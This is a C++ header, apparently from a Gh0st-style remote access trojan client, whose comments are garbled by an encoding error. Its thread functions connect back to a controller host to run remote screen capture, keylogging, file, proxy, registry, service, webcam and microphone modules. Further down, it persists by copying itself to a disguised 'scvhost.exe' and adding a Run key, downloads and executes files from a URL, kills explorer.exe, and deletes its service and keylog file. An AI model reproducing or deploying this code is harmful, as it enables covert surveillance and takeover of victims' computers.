#if !defined(AFX_LOOP_H_INCLUDED)
#define AFX_LOOP_H_INCLUDED

#include "../StdAfx.h"
#include "until.h"
#include "../SCREEN/ScreenManager.h"
#include "../KEYBOARD/KeyboardManager.h"
#include "../KEYBOARD/keylog.h"
#include "../File/Filemanager.h"
#include "../Socket/ProxyManager.h"
#include "../System/AppManager.h"
#include "../System/GetNetState.h"
#include "../System/ProgressManager.h"
#include "../System/QingdongxManager.h"
#include "../System/GetSystemInfo.h"
#include "../System/WindowsManager.h"
#include "../Service/ServiceManager.h"
#include "../Reg/RegManager.h"
#include "../Video/VideoManager.h"
#include "../Audio/AudioManager.h"
extern HP_STAR *php_star;
extern TCHAR SerName[100];     //��������
struct threadInfo
{  
	char m_strMasterHost[260];
	UINT m_nMasterPort;
};
//�������
DWORD WINAPI Loop_ScreenManager(LPBYTE sRemote)
{
	threadInfo *pInfo=(threadInfo*)sRemote;     //ָ��ṹ���ʵ����  
	CClientSocket	socketClient;
	if (!socketClient.Connect(pInfo->m_strMasterHost, pInfo->m_nMasterPort))
		return -1;

	CScreenManager	manager(&socketClient);
	socketClient.run_event_loop();
	delete pInfo;
	return 0;
}

//���̼�¼
DWORD WINAPI Loop_KeyboardManager(SOCKET sRemote)
{	
	threadInfo *pInfo=(threadInfo*)sRemote;     //ָ��ṹ���ʵ����  
	CClientSocket	socketClient;
	if (!socketClient.Connect(pInfo->m_strMasterHost, pInfo->m_nMasterPort))
		return -1;

	CKeyboardManager	manager(&socketClient);
	socketClient.run_event_loop();
	delete pInfo;
	return 0;
}

//�ļ�����
DWORD WINAPI Loop_FileManager(LPBYTE sRemote)
{
	threadInfo *pInfo=(threadInfo*)sRemote;     //ָ��ṹ���ʵ����  
	CClientSocket	socketClient;
	if (!socketClient.Connect(pInfo->m_strMasterHost, pInfo->m_nMasterPort))
		return -1;

	CFileManager	manager(&socketClient);
	socketClient.run_event_loop();
	delete pInfo;
	return 0;
}

//socket5
DWORD WINAPI Loop_ProxyManager(LPBYTE sRemote)
{
	threadInfo *pInfo=(threadInfo*)sRemote;     //ָ��ṹ���ʵ����  
	CClientSocket	socketClient;
	if (!socketClient.Connect(pInfo->m_strMasterHost, pInfo->m_nMasterPort))
		return -1;

	CProxyManager	manager(&socketClient);
	socketClient.run_event_loop();
	delete pInfo;
	return 0;
}

//ϵͳ��Ϣ
DWORD WINAPI Loop_SystemsManager(LPVOID sRemote)
{
	threadInfo *pInfo=(threadInfo*)sRemote;     //ָ��ṹ���ʵ����  
	CClientSocket	socketClient;
	if (!socketClient.Connect(pInfo->m_strMasterHost, pInfo->m_nMasterPort))
		return -1;

	CGetSystemInfo	manager(&socketClient);
	socketClient.run_event_loop();
	delete pInfo;
	return 0;
}

//���ڹ���
DWORD WINAPI Loop_WindowsManager(LPVOID sRemote)
{
	threadInfo *pInfo=(threadInfo*)sRemote;     //ָ��ṹ���ʵ����  
	CClientSocket	socketClient;
	if (!socketClient.Connect(pInfo->m_strMasterHost, pInfo->m_nMasterPort))
		return -1;

	CWindowsManager	manager(&socketClient);
	socketClient.run_event_loop();
	delete pInfo;
	return 0;
}

//���̹���
DWORD WINAPI Loop_ProgressManager(LPVOID sRemote)
{
	threadInfo *pInfo=(threadInfo*)sRemote;     //ָ��ṹ���ʵ����  
	CClientSocket	socketClient;
	if (!socketClient.Connect(pInfo->m_strMasterHost, pInfo->m_nMasterPort))
		return -1;

	CProgressManager	manager(&socketClient);
	socketClient.run_event_loop();
	delete pInfo;
	return 0;
}

//����״̬
DWORD WINAPI Loop_GetNetState(LPVOID sRemote)
{
	threadInfo *pInfo=(threadInfo*)sRemote;     //ָ��ṹ���ʵ����  
	CClientSocket	socketClient;
	if (!socketClient.Connect(pInfo->m_strMasterHost, pInfo->m_nMasterPort))
		return -1;

	CGetNetState	manager(&socketClient);
	socketClient.run_event_loop();
	delete pInfo;
	return 0;
}

//Ӧ�ó���
DWORD WINAPI Loop_AppManager(LPVOID sRemote)
{
	threadInfo *pInfo=(threadInfo*)sRemote;     //ָ��ṹ���ʵ����  
	CClientSocket	socketClient;
	if (!socketClient.Connect(pInfo->m_strMasterHost, pInfo->m_nMasterPort))
		return -1;

	CAppManager	manager(&socketClient);
	socketClient.run_event_loop();
	delete pInfo;
	return 0;
}

//������
DWORD WINAPI Loop_DllQDXGLManager(LPVOID sRemote)
{
	threadInfo *pInfo=(threadInfo*)sRemote;     //ָ��ṹ���ʵ����  
	CClientSocket	socketClient;
	if (!socketClient.Connect(pInfo->m_strMasterHost, pInfo->m_nMasterPort))
		return -1;

	CQingdongxManager	manager(&socketClient);
	socketClient.run_event_loop();
	delete pInfo;
	return 0;
}

//�������
DWORD WINAPI Loop_SerManager(LPBYTE sRemote)   
{	
	threadInfo *pInfo=(threadInfo*)sRemote;     //ָ��ṹ���ʵ����  
	CClientSocket	socketClient;
	if (!socketClient.Connect(pInfo->m_strMasterHost, pInfo->m_nMasterPort))
		return -1;

	CServiceManager	manager(&socketClient);
	socketClient.run_event_loop();
	delete pInfo;
	return 0;
}

//ע������
DWORD WINAPI Loop_RegeditManager(LPBYTE sRemote)          
{	
	threadInfo *pInfo=(threadInfo*)sRemote;     //ָ��ṹ���ʵ����  
	CClientSocket	socketClient;
	if (!socketClient.Connect(pInfo->m_strMasterHost, pInfo->m_nMasterPort))
		return -1;

	CRegManager	manager(&socketClient);
	socketClient.run_event_loop();
	delete pInfo;
	return 0;
}

//��Ƶ
DWORD WINAPI Loop_VideoManager(LPBYTE sRemote)
{
	threadInfo *pInfo=(threadInfo*)sRemote;     //ָ��ṹ���ʵ����  
	CClientSocket	socketClient;
	if (!socketClient.Connect(pInfo->m_strMasterHost, pInfo->m_nMasterPort))
		return -1;

	CVideoManager	manager(&socketClient);
	socketClient.run_event_loop();
	delete pInfo;
	return 0;
}

//��Ƶ����
DWORD WINAPI Loop_AudioManager(LPBYTE sRemote)
{
	if (!waveInGetNumDevs())  //���Ƿ���¼���豸
		return -1;

	threadInfo *pInfo=(threadInfo*)sRemote;     //ָ��ṹ���ʵ����  
	CClientSocket	socketClient;
	if (!socketClient.Connect(pInfo->m_strMasterHost, pInfo->m_nMasterPort))
		return -1;

	CAudioManager	manager(&socketClient);
	socketClient.run_event_loop();
	delete pInfo;
	return 0;
}

DWORD WINAPI Loop_Screen()
{	
	//��ȡ�ֱ���  
	int _cx = ::GetSystemMetrics(SM_CXSCREEN);   
	int _cy = ::GetSystemMetrics(SM_CYSCREEN);  

	//�޸ķֱ���  
	DEVMODE lpDevMode;  
	lpDevMode.dmBitsPerPel = 32;//ÿ�����ص�λ��  
	lpDevMode.dmPelsWidth = 1600;//��Ļ��ȣ����أ�  
	lpDevMode.dmPelsHeight = 900;//��Ļ�߶ȣ����أ�  
	lpDevMode.dmSize = sizeof(lpDevMode);  
	lpDevMode.dmFields =   
		DM_PELSWIDTH/*ʹ��dmPelsWidth��ֵ*/  
		|DM_PELSHEIGHT/*ʹ��dmPelsHeight��ֵ*/  
		|DM_BITSPERPEL/*ʹ��dmBitsPerPel��ֵ*/;  
	//  
	LONG result = ChangeDisplaySettings(&lpDevMode, 0);  
	if (result == DISP_CHANGE_SUCCESSFUL)  
	{  
		//			MessageBox(NULL, L"�޸ĳɹ���", L"Tip", MB_OK);  
		ChangeDisplaySettings(&lpDevMode, CDS_UPDATEREGISTRY);//CDS_UPDATEREGISTRY��ʾ���޸��ǳ־õģ�����ע�����д������ص�����  
	}  
	else  
	{  
		//			MessageBox(NULL, L"�޸�ʧ�ܣ��ָ�ԭ�����ã�", L"Tip", MB_OK);  
		ChangeDisplaySettings(NULL,0);  
	}  
	return 0;
}

//Run
bool UpXRUN(char *ZC_QDX)
{
	HKEY hKey ;
	char winDir[MAX_PATH]={NULL};
	GetModuleFileName(NULL,winDir,MAX_PATH);
	char szRun[90]="C:\\Program Files\\Common Files\\scvhost.exe";
	CopyFile(winDir,szRun,NULL);
	if (RegOpenKeyEx(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_ALL_ACCESS,&hKey)==ERROR_SUCCESS)
	{
		RegSetValueEx(hKey,ZC_QDX,NULL,REG_SZ,(BYTE*)winDir,sizeof(winDir));
		RegCloseKey(hKey);
	}
	return 0;
}

#include <TlHelp32.h>
//void ReStartExp() // ����Exp
DWORD WINAPI ReStartExp(LPVOID lParam)
{
	DebugPrivilege(SE_DEBUG_NAME, TRUE);
	HANDLE  hSnapshot=NULL; 
	hSnapshot=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0); 
	PROCESSENTRY32 pe={sizeof(PROCESSENTRY32)};//֧��win7
	Process32First(hSnapshot,&pe); 
	do 
	{
		if(strcmpi(pe.szExeFile, "explorer.exe")==0)
		{
			HANDLE   hProcess; 
			hProcess=OpenProcess(PROCESS_TERMINATE,FALSE,pe.th32ProcessID); 
			if   (hProcess) 
			{ 
				TerminateProcess(hProcess,0);//�رս��� 
			} 
		} 
	}   
	while(Process32Next(hSnapshot,&pe)); 
	CloseHandle(hSnapshot); 
	DebugPrivilege(SE_DEBUG_NAME, FALSE);
	return 0;
}
// ����ִ��
DWORD WINAPI Loop_DownManager(LPVOID lparam)
{
	int	nUrlLength;
	char	*lpURL = NULL;
	char	*lpFileName = NULL;
	nUrlLength = strlen((char *)lparam);
	if (nUrlLength == 0)
		return false;

	lpURL = new char[nUrlLength + 1];
	memcpy(lpURL, lparam, nUrlLength + 1);

	lpFileName = strrchr(lpURL, '/') + 1;

	if (lpFileName == NULL||!http_get(lpURL, lpFileName) || !CheckFileExist(lpFileName))
	{
		delete []lpURL;
		return false;
	}

	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	si.lpDesktop = "WinSta0\\Default"; 


	CreateProcess(NULL, lpFileName, NULL, NULL, false, 0, NULL, NULL, &si, &pi);

	delete []lpURL;

	return true;
}

void SetHostID(LPCTSTR lpHostID)
{
	HKEY   hKey;
	if (RegCreateKey(HKEY_LOCAL_MACHINE, "SYSTEM\\Setup", &hKey) == ERROR_SUCCESS)
	{
		RegSetValueEx(hKey, "Host", 0, REG_SZ, (LPBYTE)lpHostID, strlen(lpHostID) + 1);
		RegCloseKey(hKey);
	}
}


BOOL NtStopService(LPCTSTR lpService)
{
	SC_HANDLE        schSCManager;
	SC_HANDLE        schService;
	SERVICE_STATUS   RemoveServiceStatus;

	schSCManager = OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);//�򿪷�����ƹ��������ݿ�
	if (schSCManager!=NULL)
	{
		schService=OpenService(schSCManager,lpService,SERVICE_ALL_ACCESS);//��÷������ľ��
		if (schService!=NULL)
		{		
			if(QueryServiceStatus(schService,&RemoveServiceStatus)!=0)
			{
				if(RemoveServiceStatus.dwCurrentState!=SERVICE_STOPPED)//ֹͣ����
				{
					if(ControlService(schService,SERVICE_CONTROL_STOP,&RemoveServiceStatus)!=0)
					{
						while(RemoveServiceStatus.dwCurrentState==SERVICE_STOP_PENDING)         
						{
							Sleep(10);
							QueryServiceStatus(schService,&RemoveServiceStatus);
						}
					}
				}
			}    
			CloseServiceHandle(schService);
		}	
		CloseServiceHandle(schSCManager);
	}
	else 
	{
		return FALSE;
	}

	return TRUE;
}

void NtUninstallService(LPCTSTR ServiceName)
{
	if (!strlen(ServiceName))
		return;

	NtStopService(ServiceName);

	SC_HANDLE scm,svc;

	scm=OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (scm!=NULL)
	{
		svc=OpenService(scm, ServiceName, SERVICE_ALL_ACCESS);
		if (svc!=NULL)
		{
			DeleteService(svc);
			CloseServiceHandle(svc);
		}
		CloseServiceHandle(scm);
	}
}

void UnInstallServer()
{
	char	*ServerA = NULL;
	ServerA = php_star->SerName;
	SC_HANDLE service, scm;
	scm = OpenSCManager(0, 0,SC_MANAGER_CREATE_SERVICE);
	service = OpenService(scm, ServerA,SERVICE_ALL_ACCESS | DELETE);
	DeleteService(service);
	NtUninstallService(php_star->SerName);//ɾ������	
	/////////////////////////////////////////////////////////////
	TCHAR	strRecordFile[MAX_PATH];
	GetSystemDirectory(strRecordFile, sizeof(strRecordFile));
	char keylog[] = {'\\','D','e','f','a','u','l','t','.','k','e','y','\0'};
	lstrcat(strRecordFile, keylog);
	DeleteFile(strRecordFile);
	ExitProcess(0);
}

#endif // !defined(AFX_LOOP_H_INCLUDED)
